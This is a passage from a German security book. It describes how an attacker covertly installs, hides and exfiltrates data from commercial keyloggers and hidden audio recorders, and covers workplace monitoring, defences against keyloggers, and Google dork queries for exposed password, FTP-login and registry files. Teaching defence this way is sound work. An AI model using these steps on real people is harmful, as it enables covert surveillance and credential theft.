installiert, kann man einige dieser Fragen praktisch kl\u00e4ren und eventuell lokal vorhandene Sicherheitseinrichtungen entsprechend manipulieren. Bei Firmen-PCs wird der Angreifer aber auf jeden Fall darauf achten, wie und in welchem Umfang der PC von au\u00dfen administriert wird, z. B. ob Fernwartungstools die installierten Softwarepakete \u00fcberwachen (aus lizenzrechtlichen Gr\u00fcnden) und ob diese gegebenenfalls eine Infektion melden w\u00fcrden. Auch w\u00e4re zu kl\u00e4ren, welche Schwierigkeiten im Vorfeld von der externen Firewall zu erwarten sind. Fast alle Keylogger verf\u00fcgen \u00fcber mehrere M\u00f6glichkeiten, die gesammelten Informationen nach drau\u00dfen zu \u00fcbermitteln. Die verschl\u00fcsselten Logfiles k\u00f6nnen lokal auf dem Rechner abgelegt sein, sie k\u00f6nnen aber auch (zus\u00e4tzlich) via E-Mail oder FTP an den Angreifer verschickt werden. Hier w\u00e4re dann gut zu wissen, welche Ports die Firmenfirewall gegebenenfalls blockt und ob deren Logfiles regelm\u00e4\u00dfig auf potenzielle Sicherheitslecks vom Administratoren gecheckt werden.\n13.1.2 Festlegen des \u00dcberwachungsumfangs Ist der Sicherheitslevel des Ziel-PCs ann\u00e4hernd bekannt, muss der Angreifer nur noch kl\u00e4ren, welche Daten er regelm\u00e4\u00dfig \u00fcberwachen will. Die \u00dcberwachungsm\u00f6glichkeiten von Keyloggern sind betr\u00e4chtlich. Je nach Produkt k\u00f6nnen \u2022\nTastaturanschl\u00e4ge applikationsabh\u00e4ngig aufgezeichnet,\n\u2022\nInternetaktivit\u00e4ten protokolliert,\n162\nKapitel 13 \u2013 Szenario II: Der PC ist verwanzt\n\u2022\nder Inhalt der Zwischenablage gesichert,\n\u2022\nPassw\u00f6rter inklusive Windows-Logon gespeichert,\n\u2022\nOnline-Chats protokolliert,\n\u2022\nE-Mails \u00fcberwacht und\n\u2022\nregelm\u00e4\u00dfig Screenshots erstellt\nwerden. Manche dieser Surveillance Tools k\u00f6nnen zeitgesteuert ein- und ausgeschaltet werden; fast alle verf\u00fcgen \u00fcber einen mehr oder weniger guten Stealth-Mechanismus, der ihre Anwesenheit vor allzu neugierigen Augen tarnt. Die ausspionierten Daten sind in aller Regel verschl\u00fcsselt abgelegt und vor dem Zugriff des Betriebssystems gesch\u00fctzt.\n13.1.3 Installation des Keyloggers Hier hat der Angreifer die Wahl, ob er eine Remote-Installation vornimmt oder das Programm selbst auf den Rechner des Opfers aufspielt. Die Remote-Installation ist dann erste Wahl, wenn es keine pragmatische M\u00f6glichkeit gibt, auf den PC der Zielperson aktiv zuzugreifen. Der Angreifer muss aber zu keiner bekannten Malware greifen, sondern kann diese H\u00fcrde auch mit kommerziellen Keyloggern l\u00f6sen. Bestes Beispiel daf\u00fcr ist der Keylogger von Ardamax. Er kann bequem am h\u00e4uslichen Rechner vorkonfiguriert werden:\nBild 13.3: RemoteInstallation eines Keyloggers\nWie bei richtigen Trojanern gibt es ein Bindemodul, mit dem das Servermodul des Keyloggers z. B. mit einem Viewer zusammengepackt werden kann. Das Opfer startet die zugesandte Datei, freut sich \u00fcber den neuen Viewer und installiert im Hintergrund den Keylogger gleich mit. Sinnvollerweise wird der Angreifer den Keylogger auch stealthen, um seine vorzeitige Entdeckung zu verhindern. Ansonsten muss nur noch der\n13.1 Software-Keylogger\n163\nKommunikationsweg festgelegt werden, also wie die geloggten Daten zum Angreifer kommen. Sich die Dateien via E-Mail schicken zu lassen, ist eine der bequemsten M\u00f6glichkeiten. Allerdings muss man daf\u00fcr den SMTP-Server spezifizieren, \u00fcber den die Mail vom Opfer-PC ins Postfach des Angreifers gelangen soll. Fehler wirken sich hier verheerend aus, weswegen viele Keylogger bei der Vor-Ort-Installation einen Testmodus anbieten. Meist ist es einfacher, sich die Logs via HTTP oder FTP zuschicken zu lassen. Ein Spezialfall ist der Zugriff von au\u00dfen auf die Logdateien, wie ihn auch Remote Administration Tools bieten, d. h., der Keylogger richtet hier einen Service ein, wo ein Angreifer \u00fcber einen definierten Port (nat\u00fcrlich mit Login) auf die versteckten Dateien zugreift.\nBild 13.4: Stealthen des Keyloggers\nDanach ist die Arbeit des Remote-Angreifers erst einmal getan. F\u00fcr den Angreifer vor Ort bieten sich im Gegenzug aber bessere, weil gezieltere Konfigurationsm\u00f6glichkeiten an \u2013 n\u00e4mlich in Abh\u00e4ngigkeit von der jeweiligen Betriebssystem- und Sicherheitskonfiguration. Ist n\u00e4mlich eine Firewall auf dem Zielrechner aktiv, w\u00e4re es ein Kunstfehler, diese einfach bei der Installation zu deaktivieren: Selbst ein wenig misstrauischer User w\u00fcrde sich fragen, warum auf einmal keine Firewall mehr aktiv ist. Besser ist es, den Keylogger einfach in die Liste der erlaubten Programme einzutragen.\n164\nKapitel 13 \u2013 Szenario II: Der PC ist verwanzt\nBild 13.5: Keylogger und Firewall lernen sich kennen.\nZu dem Zweck wird dem installierten Treiber die dauerhafte Genehmigung erteilt, quasi unter den Augen der Firewall, bei jedem Programmstart aktiv werden zu d\u00fcrfen. Sofern der Angreifer die Daten zu seinem FTP-Server oder E-Mail-Fach exportieren m\u00f6chte, muss diese Aktivit\u00e4t bzw. Funktion vom Angreifer ebenfalls firewallseitig in die Liste erlaubter Programme eingetragen werden. Fassen wir den dritten Schritt noch einmal kurz zusammen: Die Kunst der Verwanzung besteht haupts\u00e4chlich darin, einen Keylogger so im System zu verankern, dass das Opfer mit herk\u00f6mmlichen Scantechniken nichts von seiner T\u00e4tigkeit merkt. Eine Vor-OrtInstallation bietet hier grunds\u00e4tzlich die besseren M\u00f6glichkeiten, da der Keylogger hier systemgerecht eingepasst werden kann.\n13.1 Software-Keylogger\n165\nBild 13.6: Elite Keylogger konfigurieren\n13.1.4 Sichten, Bewerten und Ausnutzen der gewonnenen Daten Der Angreifer wird darauf achten, jeden Hinweis auf seine Existenz zu verwischen. Der Lausch-/Sp\u00e4hangriff macht nur dann Sinn, wenn er auch im Fall des Entdecktwerdens durch das Opfer nicht auf seinen Urheber zur\u00fcckverfolgt werden kann. Aus diesen Gr\u00fcnden wird der Angreifer einen anonymen E-Mail-Account benutzen bzw. als FTPServer eines der zahllosen Gratisangebote von Service-Providern, das nicht mit seiner Person in Verbindung gebracht werden kann.\n13.1.5 Die Audio-Wanze Eine relativ unbekannte Technik, akustische Informationen mithilfe eines PCs abzugreifen, sind Audiorecorder. Typische Vertreter ihrer Art wie der Total Recorder44 (ab 11,95 \u20ac) k\u00f6nnen zwar auch Aufzeichnungen von angeschlossenen Mikrofonen machen, aber \u2013 im Gegensatz zum Stealth Recorder Pro45 \u2013 nicht unbemerkt im Hintergrund aufzeichnen, geschweige denn die Audioprotokolle in festgelegten Abst\u00e4nden 44\nhttp://www.highcriteria.com/\n45\nhttp://www.topofbestsoft.com/index_srp.htm\n166\nKapitel 13 \u2013 Szenario II: Der PC ist verwanzt\nzum Angreifer senden. Noch ausgefeilter ist die Option, von au\u00dfen via FTP- oder Webbrowser auf die akustischen Logfiles zuzugreifen.\nBild 13.7: Remote Access f\u00fcr Stealth Recorder Pro\nAlles, was ein Angreifer tun muss, ist, das Programm z. B. auf Ihrem PC zu installieren und in den Stealthmodus zu versetzen. Im Gegensatz zu normalen Audiorecordern verf\u00fcgt das Programm \u00fcber einen sehr ausgefeilten Verst\u00e4rkermodus, der eine bis zu 100-fache Verst\u00e4rkung des Ausgangssignals erlaubt. Selbst mit billigen Mikrofonen kann in sehr guter Sprachqualit\u00e4t alles im Umkreis von etwa 10 m aufgezeichnet werden. Kombiniert man das Tool mit einem kleinen, unauff\u00e4lligen Mikrofon, das in die entsprechende Buchse der Soundkarte (R\u00fcckseite des Rechners) eingesteckt wird, hat der Angreifer eine sehr preisg\u00fcnstige, unauff\u00e4llige und leistungsf\u00e4hige Abh\u00f6ranlage in Netzreichweite. Anders als bei den klassischen, drahtlos arbeitenden Abh\u00f6rwanzen kann diese Audiowanze auch nicht von Minispion-Detektoren geortet werden.\nBild 13.8: Mini-Mikro von Sony (Preis ca. 12 \u20ac)\nNoch eleganter gestaltet sich der Angriff, wenn das Tool auf einem Notebook mit integriertem Mikrofon installiert wird. Um nicht sinnlos Festplattenplatz zu verschwenden, kann die MP3-Komprimierung pr\u00e4zise eingestellt und auch die Ansprechempfindlichkeit auf die r\u00e4umlichen Gegebenheiten angepasst werden.\n13.2 Big Brother im B\u00fcro\n167\nBild 13.9: Stealth Recorder Pro bietet zahlreiche Features.\nWill der Angreifer die komplette audiovisuelle \u00dcberwachung des Opfers via PC, m\u00fcsste er auf ein Remote Administration Tool zur\u00fcckgreifen, das \u00fcber umfassendere M\u00f6glichkeiten des Zugriffs verf\u00fcgt (vgl. Kapitel \u00bbAngriff aus dem Web\u00ab).\n13.2\nBig Brother im B\u00fcro\nDass Unternehmen fallweise ihre Mitarbeiter \u00fcberwachen beziehungsweise ausspionieren \u2013 unabh\u00e4ngig von der Gesetzeslage \u2013, darf als gesichert gelten. Die Aff\u00e4re bei der Deutschen Bahn ist hier wohl nur die Spitze des Eisbergs. Zum Einsatz kommen klassische Tools wie Orvell, Spector Pro, eBlaster und andere. \u00c4hnlich wie klassische Malware (Trojaner, RATs, Keylogger) sind diese Produkte in der Lage, alle Bildschirmbeziehungsweise User-Aktivit\u00e4ten vollst\u00e4ndig zu protokollieren, ohne dass dies dem Betreffenden, der h\u00e4ufig \u00fcber kein Admin-Login verf\u00fcgt, transparent sein w\u00fcrde. Auf die Ergebnisse kann nat\u00fcrlich auch remote zugegriffen werden. Im Taskmanager wie auch im Explorer ist die Anwesenheit dieser Tools nicht erkennbar. Nat\u00fcrlich kann auch direkt auf dem verwanzten PC auf die \u00dcberwachungsergebnisse zugegriffen werden, etwa bei Spector Pro mit der Tastenkombination [Alt]-[Ctrl]-[Shift]-[S]. Wer hingegen nur mal sehen will, was der Angestellte oder Kollege an seinem PC so treibt, auf welchen Seiten er surft, welche Downloads er gestartet hat, kann dies mit Freeware-Programmen wie dem BTF-Sniffer46 tun:\n46\nhttp://home.arcor.de/B.T.F/BTFSniffer/?f=id&v=1.35\n168\nKapitel 13 \u2013 Szenario II: Der PC ist verwanzt\nBild 13.10: Eines der \u00bbbesten\u00ab offiziellen \u00dcberwachungstools\nBild 13.11: Offline schn\u00fcffeln mit dem BTF-Sniffer\n13.3 Abwehrma\u00dfnahmen gegen Keylogger & Co.\n169\nGrunds\u00e4tzlich ist gegen solche Tools im B\u00fcro kein Kraut gewachsen beziehungsweise die Abwehrm\u00f6glichkeit gering, da aus faktischen (eingeschr\u00e4nkte Benutzerrechte) wie juristischen Gr\u00fcnden (Eigentumsrechte) der \u00bbeinfache\u00ab Benutzer hier stark gehandicapt ist.\n13.3\nAbwehrma\u00dfnahmen gegen Keylogger & Co.\nFast alle hier beschriebenen Angriffstechniken basieren auf einem physischen Zugriff auf Ihrem Rechner. Bei den Abwehrma\u00dfnahmen m\u00fcssen wir also unterscheiden, ob ein mutma\u00dflicher Angriffsversuch bereits durchgef\u00fchrt wurde oder ob lediglich prophylaktisch zus\u00e4tzliche Ma\u00dfnahmen ergriffen werden sollen, um derartige Angriffe im Vorfeld zu blocken. Auf der sicheren Seite sind Sie jedenfalls erst nach einem Scan Ihrer Festplatte. Da Keylogger meistens sehr gut getarnt sind, gestaltet sich ihr Nachweis oft als recht schwierig. Schwierig hei\u00dft: Sie brauchen erstens die geeigneten Werkzeuge zum Aufsp\u00fcren und Vernichten dieser Sch\u00e4dlinge und zweitens ein Minimum an Systemkenntnis. Alle softwarebasierten Keylogger k\u00f6nnen sowohl anhand ihrer Signatur als auch anhand ihres Systemverhaltens identifiziert werden. Kommerzielle Viren- und Spyware-Scanner k\u00f6nnen, sofern sie regelm\u00e4\u00dfig aktualisiert wurden, einen Gro\u00dfteil aller SoftwareKeylogger aufsp\u00fcren und beseitigen, scheitern aber mitunter an den offiziellen Surveillance Tools (um \u00c4rger mit den Herstellern dieser Tools zu vermeiden). Nochmals schlechtere Chancen haben Sie mit diesen klassischen Securityprodukten, wenn die Sch\u00e4dlinge mit Rootkit-Technologie getarnt sind (in diesem Fall spricht man auch von Kernel-Keyloggern), da der Zugriff von Virenscannern von den Sch\u00e4dlingen meist auf Kernelebene gefiltert und au\u00dfer Gefecht gesetzt wird). Tipp Nr. 1:\nScannen Sie Ihren PC mit mehr als einem (aktuellen!) Virenscanner und checken Sie Ihr System zus\u00e4tzlich mit einem oder mehren Antirootkits. Empfehlen k\u00f6nnen wir einerseits vollautomatisch arbeitende Tools wie z. B. den F-Secure Blacklight Rootkit Eliminator47 oder das Sophos Antirootkit48. Eine bessere Erkennungs- und Reinigungsfunktion49 bieten allerdings Tools wie IceSword, GMER und Helios50.\n47\nwww.f-secure.com\n48\nwww.sophos.com\n49\nEinen vollst\u00e4ndigen \u00dcberblick \u00fcber Anti-Keylogger und Antirootkits finden Sie in meinem (Peter Kraft) Anti-Hackerz Book 2007 (Franzis Verlag).\n50\nwww.antivirus-online.de/downloadantirootkit.php?v=16\n170\nKapitel 13 \u2013 Szenario II: Der PC ist verwanzt\nBild 13.12: IceSword ettarnt den Elite Keylogger (crusoe2k.sys)\nSo gut wie alle (Kernel-)Keylogger k\u00f6nnen von IceSword, Rootkit Unhooker, AVG AntiRootkit u. a. aufgesp\u00fcrt und vernichtet werden. Da IceSword selbst mit Kernelfunktionalit\u00e4t ausgestattet ist, k\u00f6nnen auch gut gesch\u00fctzte oder getarnte Prozesse, Treiber und sonstige Dateien online gel\u00f6scht bzw. inaktiviert werden. Wenn Sie einen Keylogger enttarnt haben, sollten Sie allerdings Folgendes bedenken: Da Sie nicht wissen, wie lange der Keylogger schon Ihren PC infiltriert hat, m\u00fcssen Sie davon ausgehen, dass Ihre privaten Daten inklusive Passw\u00f6rter, Login-Daten etc. kompromittiert sind. Bevor Sie jetzt zu entsprechenden Schadensbegrenzungsma\u00dfnahmen wie dem Erneuern und Neuanlegen von Accounts greifen, stellt sich die Frage, ob Sie gegebenenfalls eine Anzeige gegen Unbekannt erstatten wollen. In diesem Fall greift unser Tipp Nr. 2: Sichern Sie die Beweise, d. h., l\u00f6schen Sie nach M\u00f6glichkeit weder den Keylogger noch die Logfiles. Am besten sichern Sie die komplette Bootpartition auf einem externen Medium mit einem Image-Backup. Entsprechende Aktionen gestalten sich in einem Heimnetzwerk wesentlich einfacher und weniger aufwendig als in einem Firmennetzwerk. Wer als Anwender in einem Firmennetzwerk einen entsprechenden Verdacht hat, dass er ausspioniert wird, kann entweder \u00fcberlegen, diesen Verdacht seinem zust\u00e4ndigen Systemadministrator oder dem Betriebsrat zu melden oder \u2013 wenn er bef\u00fcrchtet, halboffiziell ausspioniert zu werden51 \u2013 selbst aktiv werden. Dabei unterliegt der Betreffende aber etlichen Einschr\u00e4n51\nKeylogger sind oft Bestandteil von Bossware (z. B. Orvell Monitoring), mit der Surf- und Arbeitsverhalten vom Mitarbeitern \u00fcberwacht werden (siehe auch: http://network-secure.de/index.php?option=content& task=view&id=1749&Itemid=429).\n13.3 Abwehrma\u00dfnahmen gegen Keylogger & Co.\n171\nkungen, die er als Heimadministrator nicht hat. So wird es ihm organisatorisch oder technisch verwehrt sein, entsprechende Scanning-Tools eigenst\u00e4ndig auf dem FirmenPC zu installieren. Oder das Opfer verf\u00fcgt nur \u00fcber eingeschr\u00e4nkte Benutzerrechte. Die meisten Antirootkits brauchen zwar nicht eigens installiert zu werden und starten auch von CD oder einem USB-Stick, aber sie verlangen Administratorrechte f\u00fcr den Programmstart.\nBild 13.13: Die versteckten Dateien und Prozesse von Spector Plus werden durch das AVG-AntiRootkit zuverl\u00e4ssig enttarnt\nIn diesem Fall bewegt sich der Anwender auf schwankendem Boden, denn er m\u00fcsste in den von ihm benutzten Firmenrechner quasi einbrechen, um sich zu vergewissern, dass ihn Keylogger & Co. nicht ausspionieren. Das ist zwar technisch machbar52, aber rechtlich in einer Dunkelzone. Sitzt das Opfer vor einer Diskless-Workstation, ist selbst diese M\u00f6glichkeit verbaut, wobei andererseits die Wahrscheinlichkeit gering ist, dass er mit einem Keylogger infiziert wurde. Eine andere M\u00f6glichkeit \u2013 die allerdings auch einen administrativen Zugang voraussetzt \u2013 ist das Aufspielen eines Anti-Keyloggers, beispielsweise des kostenpflichtigen Anti Keylogger Shield53 oder Advanced Anti Keylogger54. F\u00fcr Unternehmen stellt sich die Problematik nochmals anders dar. Hier geht es vorzugsweise um die Abwehr von Industriespionage im weitesten Sinne. Vor fremdem Zugriff sollten alle Daten(speicher) gesch\u00fctzt werden, die gesch\u00e4ftsstrategische Informationen, Daten aus Forschung und Entwicklung, Controlling und Rechnungswesen enthalten. Da es kaum praktikabel scheint, Hunderte bzw. Tausende von Clients individuell zu pr\u00fcfen, wird der Abwehrschwerpunkt eher woanders liegen:\n52\nvgl. Szenario 1, z. B. Klonen der Festplatte und h\u00e4usliche Analyse\n53\nwww.amictools.com\n54\nwww.spydex.com\n172\nKapitel 13 \u2013 Szenario II: Der PC ist verwanzt\n\u2022\n\u00dcberwachen verd\u00e4chtiger Netzwerkaktivit\u00e4ten Keylogger speichern zwar alle relevanten Nutzeraktivit\u00e4ten, aber sie m\u00fcssen die Logs auch irgendwie dem Angreifer zug\u00e4nglich machen. Sobald Keylogger anfangen, ihre gesammelten Daten zu exportieren, wird es interessant, denn sie hinterlassen dabei Spuren: offene Ports oder regelm\u00e4\u00dfigen Zugriff auf externe Web- oder FTP-Server. Entsprechende Logauswertungen helfen, die Aktivit\u00e4ten des Angreifers zu entdecken.\n\u2022\nEinsatz von Diskless-Workstations Ein Arbeitsplatzrechner ohne Festplatte mit deaktivierten USB-Schnittstellen und ohne optische Laufwerke macht es einem lokalen Angreifer unm\u00f6glich, zum Zuge zu kommen. Die einzig verbleibende Angriffsoption via E-Mail oder pr\u00e4parierte Webseiten muss dann \u00fcber separate Firmenfirewalls gefiltert werden.\n\u2022\nZus\u00e4tzliche, softwarebasierte Securityl\u00f6sungen F\u00fcr Privatanwender wie f\u00fcr Firmen gibt es eine ganze Reihe von Softwarel\u00f6sungen, angefangen vom virtuellen Keyboard bis zu ausgefallenen Intrusion-PreventionSystemen. Eine einfache, kosteng\u00fcnstige M\u00f6glichkeit, das Ausspionieren von Passw\u00f6rtern und Logindaten zu verhindern, besteht im Einsatz eines virtuellen Keyboards, das bei Windows XP zum Lieferumfang geh\u00f6rt (Start / Ausf\u00fchren / OSK). Statt des Keyboards arbeitet der Anwender bei der Eingabe sensibler Daten (z. B. beim e-Banking) mit der Maus und einem eingeblendeten Bildschirmtablett. Es gibt allerdings Keylogger, die bei spezifischen Anwendungen komplette Bildschirmsequenzen in einer AVI-Datei speichern. In solchen F\u00e4llen kann man sich mit dem KeyScrambler55 behelfen. Tastatureingaben werden automatisch auf Kernelebene verschl\u00fcsselt. Keylogger zeichnen lediglich eine sinnlose Kombination aus Buchstaben und Zahlen auf. In der Freewareversion werden alle Eingaben, die einen Benutzernamen und ein Kennwort verlangen, innerhalb von Firefox und dem Internet Explorer verschl\u00fcsselt; f\u00fcr die Verschl\u00fcsselung sonstiger Webformulare ben\u00f6tigt man die kostenpflichtige Version (24,99 US-Dollar). Noch mehr Systemsicherheit versprechen Programme, die das System komplett gegen unzul\u00e4ssige Modifikationen des Kernels abschotten beziehungsweise Angriffe darauf abwehren: die Host Intrusion and Detection Systems (HIPS), etwa DefenseWall HIPS56. F\u00fcr engagierte und sicherheitsbewusste Privatanwender sind die zuletzt genannten Tools sicherlich eine sehr gute Investition; bei einem weitfl\u00e4chigen Firmeneinsatz muss man allerdings \u2013 wenigstens am Anfang \u2013 mit einem verst\u00e4rkten Supportaufkommen rechnen, sodass diese Tools h\u00e4ufig nur dort eingesetzt werden, wo ein besonderer Bedarf besteht.\n55\nwww.qfxsoftware.com\n56\nwww.softsphere.com\n13.3 Abwehrma\u00dfnahmen gegen Keylogger & Co.\n173\nBild 13.14: Wirkungsvolle Blockade von Keyloggern\n\u2022\nEinsatz der Zwei-Faktoren-Authentifizierung mit/ohne zus\u00e4tzlicher Kryptografie Mit dem Einsatz entsprechender Hardware (USB-Token, Smartcardreader etc.) und Software (Anmelde- und Kryptmodule) wird die letzte L\u00fccke geschlossen. Antikeylogger k\u00f6nnen zwar alle softwarebasierten Surveillance Tools aushebeln, sind aber machtlos bei Hardware-Keyloggern. Hier hilft die schon im Szenario 1 beschriebene Zwei-Faktoren-Authentifizierung.\nNeben diesen High-Tech-L\u00f6sungen gibt es nat\u00fcrlich noch eine relativ schlichte L\u00f6sung, Software-Keyloggern mit Windows-Bordmitteln auf die Spur zu kommen. Deshalb hier unser Tipp Nr. 3:\nStarten Sie den Kommandoprozessor (mit Start / Ausf\u00fchren / cmd) und legen Sie in der Kommandozeile das Verzeichnis fest, das Sie scannen m\u00f6chten (in der Regel C:\\ oder C:\\windows). Anschlie\u00dfend geben Sie dort dir s/a > c:\\scanliste-1.txt ein. Mit diesem Kommando werden f\u00fcr Vergleichszwecke alle Dateien im angegebenen Verzeichnis in die Datei scanliste-1.txt geschrieben. Im zweiten Schritt booten Sie Ihren PC mit einer CD (z. B. PE-Builder), w\u00e4hlen das identische Verzeichnis wie in Schritt 1 aus und geben in der Kommandozeile dir s /a > c:\\scanliste-2.txt ein. Der dritte und letzte Schritt wird dann sehr spannend. Sollten n\u00e4mlich Abweichungen auftreten, z. B. dass in der zweiten Scanliste auf einmal Dateien auftauchen, die in der ersten Liste nicht vorkommen, ist dies ein direktes Indiz f\u00fcr die Anwesenheit eines Rootkits. Damit Sie nicht manuell die Listen abgleichen m\u00fcssen, gibt es ein Supporttool von Microsoft namens Windiff.exe (h\u00e4ufig zu finden unter \\Programme\\Microsoft\\\n174\nKapitel 13 \u2013 Szenario II: Der PC ist verwanzt\nSupporttools), das Ihnen die Arbeit abnimmt. In der Regel k\u00f6nnen Sie die \u00fcberz\u00e4hligen Dateien (Programmdateien, Logfiles der Malware) \u00fcber die Boot-CD ohne Risiko l\u00f6schen.\nBild 13.15: Rootkits (Kernel-Keyloggern) mit WinDiff auf der Spur\nAbschlie\u00dfend noch eine Bemerkung zum hochstilisierten Bundestrojaner, mit dessen Hilfe verd\u00e4chtige Terroristen, mordsgef\u00e4hrliche Internetkriminelle und deren Helfershelfer hochoffiziell ausspioniert werden sollen. Initiiert werden k\u00f6nnte eine OnlineDurchsuchung entweder \u00fcber einen klassischen E-Mail-Angriff (mit verseuchtem Dateianhang) oder \u2013 die wahrscheinlichere M\u00f6glichkeit \u2013 \u00fcber den direkten Zugriff beim Internet Service-Provider. In der Szene wird dar\u00fcber spekuliert, dass die dort installierten Krypto-Gateways (SINA-Boxen57) von staatlichen Stellen missbraucht werden k\u00f6nnten, um dem ahnungslosen User bei jedem ausf\u00fchrbaren Download einen Trojaner quasi huckepack unter die Weste zu jubeln. Technisch ist das vermutlich mit den SINABoxen eher nicht m\u00f6glich58 \u2013 und vor allem bei der Entwicklung niemals vorgesehen worden \u2013 was aber nicht hei\u00dft, dass es generell unm\u00f6glich ist. Einige Warez-Seitenbetreiber arbeiten bereits mit solchen Modellen: Die normale Nutzerdatei wird mit dem Trojaner \u00bbgebundelt\u00ab und beim Installieren des heruntergeladenen Anwendungsprogramms wird jener klammheimlich mitinstalliert. Das ist kein Hexenwerk und l\u00e4sst sich auch mit den von uns schon beschriebenen Mitteln aushebeln bzw. inaktivieren.\n57\nvgl. www.bsi.bund.de/literat/faltbl/Sina.htm, zu allgemeinen Vorbehalten vgl. www.heise.de/security/ artikel/86415/0\n58\nvgl. Diskussion z. B. unter: http://board.gulli.com/718778-die-wunderbare-welt-der-bundestrojaner-sinaboxen-und-mailueberwachung/\n175\n14 Szenario III: Spurensucher im Netz Ausgangsszenario: Im Gegensatz zu den beiden ersten Angriffsszenarien geraten Sie eher zuf\u00e4llig ins Visier der Angreifer, z. B. weil Ihr Heimnetzwerk oder Ihre Webseite kritische Sicherheitsl\u00fccken aufweisen, die der Angreifer bei einem mehr oder minder zuf\u00e4lligen Scan entdeckt hat. Damit wir uns hier nicht missverstehen: Die Techniken, die wir hier vorstellen, bewegen sich juristisch in einer Grauzone. Der Spurensucher bricht nicht direkt in Ihren Rechner, Ihr Heimnetzwerk oder Ihre Webseite ein, er sammelt erst einmal nur Informationen. Es mag sein, dass Sie auch in der Folge nichts von seinen Aktionen mitbekommen \u2013 es sei denn, Sie w\u00fcrden regelm\u00e4\u00dfig die Logs Ihrer Firewall durchsehen. Aber: Im Hintergrund bereitet er wom\u00f6glich einen durchdringenden Angriff vor. Die gute Nachricht zuerst: Man hat es nicht direkt auf Sie abgesehen. Niemand hat etwas gegen Sie pers\u00f6nlich. Ihr einziger Nachteil ist es, in einer bestimmten IP-Range zu liegen und offenkundige Sicherheitsm\u00e4ngel nicht beseitigt zu haben. Der typische Angreifer sitzt vor seiner Maschine und scannt einfach nur gr\u00f6\u00dfere Bereiche im Internet nach kritischen Stellen, die seine Neugierde reizen k\u00f6nnten. Die schlechte Nachricht: Sie bekommen von diesem Tun \u2013 dem Spurensammeln \u2013 in der Regel nichts mit. Und wenn Sie etwas mitbekommen und man es auf Sie abgesehen hat, ist es meistens zu sp\u00e4t. Dumm, nicht? Fangen wir vorne an. Sie erinnern sich an Matrix? Zentrale Figur dieser Reihe ist Neo, der Auserw\u00e4hlte. Anfangs zweifelt er an seiner Berufung. Sein Entdecker ist Morpheus, eine Art Zen-Meister. Als Neo zweifelt, nimmt er ihn mit zum Orakel, verk\u00f6rpert durch eine mysteri\u00f6se alte Frau. Sie teilt ihm mit, was er wissen muss, und gibt ihm dann einen Keks. In unserer Welt wird das Orakel durch Google verk\u00f6rpert, jedenfalls nach Meinung von Jonny Long, Autor des bekannten Buches Google-Hacking. Warum das so ist, erfahren Sie hier im Schnelldurchgang. Zus\u00e4tzlich kann ich Ihnen einen Besuch auf Johnnys Seite59 mit ihrer ber\u00fchmten Google-Hacking Database nur w\u00e4rmstens empfehlen. Warum Google Hacks so erfolgreich sind? Die Antwort liegt wesentlich in Googles \u00bbNeugierde\u00ab: mehr als 2,4 Billionen indizierter Seiten im Netz.\n59\nhttp://johnny.ihackstuff.com/index.php?module\n176\n14.1\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\nGoogle-Hacking\n14.1.1 Angriffe Wir starten mit einem kleinen Experiment, rufen Google auf und geben folgenden Text in die Suchzeile ein:\nBild 14.1: Suche nach Passw\u00f6rtern\nWas wir hier suchen? Unsere Suchmethode \u00bbFishing for passwords\u00ab nimmt \u2013 kurz gesagt \u2013 ungesch\u00fctzte Passwortdateien ins Visier. Zwar landet man ab und an mal in einem Honigtopf60, aber die Suche f\u00f6rdert viel schneller als ein Portscan unsichere Webseiten zu Tage.\nBild 14.2: Ein Honigtopf f\u00fcr Nachwuchshacker\n60\nHoney Pots (Honigt\u00f6pfe) sind pr\u00e4parierte Serverseiten, die mit einem interessanten K\u00f6der versehen Hacker anlocken sollen, damit man deren Angriffsverhalten besser studieren kann.\n14.1 Google-Hacking\n177\nDabei sind es jetzt weniger Seiten von Firmen als private Seiten, auf denen Konfigurationsfehler einen Hacker geradezu einladen, sich n\u00e4her damit zu besch\u00e4ftigen. Beispielsweise fanden wir schon nach weniger als einer Minute folgende Seite:\nBild 14.3: Passwortdatei detektiert\nAuf die Passwortdatei kann dann in den allermeisten F\u00e4llen auch sofort zugriffen werden.\nBild 14.4: Passw\u00f6rter auf dem Pr\u00e4sentierteller\nDamit steht dann einem richtigen Einbruchsversuch nicht mehr viel im Wege. Apropos Passw\u00f6rter. Vielleicht kennen Sie ja den FTP-Client WS_FTP61? Wenn nicht, sollten Sie ihn kennenlernen, es k\u00f6nnte sich lohnen. Immer dann, wenn Sie damit z. B. auf Ihren FTP-Server zugreifen, werden dort die Logindaten abgelegt. Wenn dieses Verzeichnis jetzt nicht gesch\u00fctzt ist, k\u00f6nnen wir via Google darauf zugreifen:\n61\nwww.ipswitchft.com/Individual/Products/ws_ftp_pro/?k_id=inprolinkt1\n178\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\nBild 14.5: Suche nach FTP-Passw\u00f6rtern\nJede Wette, dass Sie gar nicht so lange suchen m\u00fcssen, bis Sie f\u00fcndig werden.\nBild 14.6: Treffer: Die WS_FTP.ini-Datei wird heruntergeladen\nEine kleine Einschr\u00e4nkung gibt\u2019s nat\u00fcrlich: Die Passw\u00f6rter f\u00fcr die User-ID liegen nur verschl\u00fcsselt vor. Man kopiert nun den vollst\u00e4ndigen Inhalt in eine Textdatei auf dem eigenen Rechner, benennt diese in WS_FTP.ini um und setzt einen Passwortcracker darauf an, zum Beispiel den FTP Password Recovery Master (unter www.rixler.com)\n14.1 Google-Hacking\n179\nBild 14.7: WS_FTP.iniPassw\u00f6rter in fast allen FTP-Clients automatisch gecrackt\nEine andere M\u00f6glichkeit, Logins zu hacken, funktioniert \u00fcber die Sucheingabe von: +intext:\"webalizer\" +intext:\"Total Usernames\" +intext:\"Usage Statistics for\" Damit wird die Webstatistik des Webalizers genutzt. Aus der Trefferliste w\u00e4hlt man jetzt die Accounts, die einen interessieren:\nBild 14.8: Benutzerdaten \u00fcber Webalizer herausfinden\nMan hat zwar jetzt nur die Usernamen (und die sind nicht immer aktuell), aber in Kombination mit einem Brute-Force-Passwortknacker wie Brutus hat man Chancen, sich Zugang zu verschaffen. Und wir k\u00f6nnen noch einen drauflegen. Wir suchen jetzt nach Registrydateien im Web. \u00dcberrascht? Einfach testen mit: filetype:reg HKEY_CURRENT_USER username Wir haben einige hundert Treffer registriert und konnten in aller Ruhe ausw\u00e4hlen, wo wir uns weitergehende Chancen ausrechnen:\n180\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\nBild 14.9: Die Registry im Internet\nDa man mit dieser Methode nicht immer an wirklich interessante Seiten herankommt, da diese meist professionell abgesichert 